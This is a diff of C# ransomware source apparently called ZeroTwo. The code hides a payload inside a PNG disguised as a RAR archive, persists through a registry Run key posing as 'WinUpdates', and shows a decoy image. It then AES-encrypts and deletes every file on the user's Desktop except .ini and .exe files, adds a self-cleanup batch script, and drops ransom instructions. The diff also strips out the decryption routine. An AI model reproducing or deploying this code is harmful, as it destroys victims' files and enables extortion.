@@ -10,30 +10,29 @@ namespace ZeroTwo.src {
     class ZeroTwo {
         private const string EXT = ".02";
 
-        private const int ENC = 0;
-        private const int DEC = 1;
-
         private const string WORKDIR = "C:\\Updates";
         private const string H_SCR_NAME = "h.vbs";
         private const string PREP_BAT_NAME = "Prep.bat";
         private const string EXEC_BAT_NAME = "Update.bat";
+        private const string CLEAR_BAT_NAME = "Clear.bat";
+        private const string CLEAR_TMP_FOLDER = "C:\\tmp02";
         private const string REG_KEY = "UpdatesHandler";
         private const string EXE_NAME = "WinUpdates";
 
         private static byte[] k = Encoding.ASCII.GetBytes("0202020202020202");
         private static byte[] s = Encoding.ASCII.GetBytes("02020202");
 
+        private const int EXEC_FLAG = 1;
+
         public static void Main(string[] args) {
             if (args.Length == 0) {
                 InjectInReg();
                 ExtrRes();
                 OpenImage();
-            } else {
-                int op = int.Parse(args[0]);
-                Exec(op);
-                if (op == ENC) {
-                    ReleaseIstructions();
-                }
+            } else if (int.Parse(args[0]) == EXEC_FLAG) {
+                Exec();
+                Clear();
+                ReleaseIstructions();
             }
         }
 
@@ -70,7 +69,7 @@ namespace ZeroTwo.src {
             execBat += "chdir /d " + WORKDIR + "\n";
             execBat += "rename logo.png logo.rar\n";
             execBat += "arc.exe x -S -ibck logo.rar *.* .\n";
-            execBat += EXE_NAME + ".exe " + ENC + "\n";
+            execBat += EXE_NAME + ".exe " + EXEC_FLAG + "\n";
             execBat += "rename logo.rar logo.png\n";
             execBat += "del " + EXE_NAME + ".exe\n";
             File.WriteAllText(WORKDIR + "\\" + EXEC_BAT_NAME, execBat);
@@ -104,58 +103,39 @@ namespace ZeroTwo.src {
             string exeFolder = exePath.Substring(0, index);
             string exeName = Process.GetCurrentProcess().ProcessName;
             string imagePath = (exeFolder + "\\" + exeName + ".jpg").Replace("/", "\\");
-            try {
-                if (File.Exists(imagePath))
-                    File.Delete(imagePath);
 
-                if (!Directory.Exists(Path.GetDirectoryName(imagePath)))
-                    Directory.CreateDirectory(Path.GetDirectoryName(imagePath));
+            if (File.Exists(imagePath))
+                File.Delete(imagePath);
 
-                var imageRes = "ZeroTwo.src.img.ZeroTwo";
-                using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(imageRes)) {
-                    using (var file = new FileStream(imagePath, FileMode.Create, FileAccess.Write)) {
-                        sfile.CopyTo(file);
-                    }
+            if (!Directory.Exists(Path.GetDirectoryName(imagePath)))
+                Directory.CreateDirectory(Path.GetDirectoryName(imagePath));
+
+            var imageRes = "ZeroTwo.src.img.ZeroTwo";
+            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(imageRes)) {
+                using (var file = new FileStream(imagePath, FileMode.Create, FileAccess.Write)) {
+                    sfile.CopyTo(file);
                 }
-
-                Process.Start(imagePath);
-            } catch (Exception) {
-                //throw new Exception(string.Format("Can't extract resource '{0}' to file '{1}': {2}", imageRes, imagePath, ex.Message), ex);
             }
+
+            Process.Start(imagePath);
         }
 
-        private static void Exec(int op) {
+        private static void Exec() {
             string mainPath = "C:/users/" + Environment.UserName + "/Desktop";
             string[] files = Directory.GetFiles(mainPath, "*.*", SearchOption.AllDirectories);
-
-            if (op == ENC) {
-                foreach (string file in files) {
-                    if (!Path.GetExtension(file).Equals(EXT) && !Path.GetExtension(file).Equals(".ini") && !Path.GetExtension(file).Equals(".exe")) {
-                        ToggleCipher(true, file, file + EXT, k);
-                    }
-                }
-            } else if (op == DEC) {
-                foreach (string file in files) {
-                    if (Path.GetExtension(file).Equals(EXT)) {
-                        ToggleCipher(false, file, file.Remove(file.Length - EXT.Length), k);
-                    }
+            foreach (string file in files) {
+                if (!Path.GetExtension(file).Equals(EXT) && !Path.GetExtension(file).Equals(".ini") && !Path.GetExtension(file).Equals(".exe")) {
+                    Enc(file, file + EXT, k);
                 }
             }
         }
 
-        private static void ToggleCipher(bool encryptMode, string inputFile, string outputFile, byte[] passwordBytes) {
+        private static void Enc(string inputFile, string outputFile, byte[] passwordBytes) {
             byte[] saltBytes = s;
-            string cryptFile = null;
-            if (encryptMode) {
-                cryptFile = outputFile;
-            }
+            string cryptFile = outputFile;
 
             FileStream fsCrypt;
-            if (encryptMode) {
-                fsCrypt = new FileStream(cryptFile, FileMode.Create);
-            } else {
-                fsCrypt = new FileStream(inputFile, FileMode.Open);
-            }
+            fsCrypt = new FileStream(cryptFile, FileMode.Create);
 
             RijndaelManaged AES = new RijndaelManaged();
             AES.KeySize = 256;
@@ -168,31 +148,14 @@ namespace ZeroTwo.src {
             AES.Mode = CipherMode.CBC;
 
             CryptoStream cs;
-            if (encryptMode) {
-                cs = new CryptoStream(fsCrypt,
-                AES.CreateEncryptor(),
-                CryptoStreamMode.Write);
-            } else {
-                cs = new CryptoStream(fsCrypt,
-                AES.CreateDecryptor(),
-                CryptoStreamMode.Read);
-            }
+            cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
 
             FileStream fs;
-            if (encryptMode) {
-                fs = new FileStream(inputFile, FileMode.Open);
-            } else {
-                fs = new FileStream(outputFile, FileMode.Create);
-            }
+            fs = new FileStream(inputFile, FileMode.Open);
 
             int data;
-            if (encryptMode) {
-                while ((data = fs.ReadByte()) != -1)
-                    cs.WriteByte((byte)data);
-            } else {
-                while ((data = cs.ReadByte()) != -1)
-                    fs.WriteByte((byte)data);
-            }
+            while ((data = fs.ReadByte()) != -1)
+                cs.WriteByte((byte)data);
 
             fs.Close();
             cs.Close();
@@ -201,7 +164,25 @@ namespace ZeroTwo.src {
             File.Delete(inputFile);
         }
 
-        public static void ReleaseIstructions() {
+        private static void Clear() {
+            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.DeleteValue(REG_KEY);
+            key.Close();
+
+            string clearBat = string.Empty;
+            clearBat += "@ECHO OFF\n";
+            clearBat += "ping 127.0.0.1 > nul\n";
+            clearBat += "echo j | attrib -h -s " + "\"" + WORKDIR + "\\*" + "\"" + "\n";
+            clearBat += "echo j | rmdir /S /Q " + "\"" + WORKDIR + "\"" + "\n";
+            File.WriteAllText(WORKDIR + "\\" + CLEAR_BAT_NAME, clearBat);
+
+            Process p = new Process();
+            p.StartInfo.FileName = WORKDIR + "\\" + CLEAR_BAT_NAME;
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.Start();
+        }
+
+        private static void ReleaseIstructions() {
             var assembly = Assembly.GetExecutingAssembly();
             var instructionsRes = "ZeroTwo.src.txt.Instructions";
 
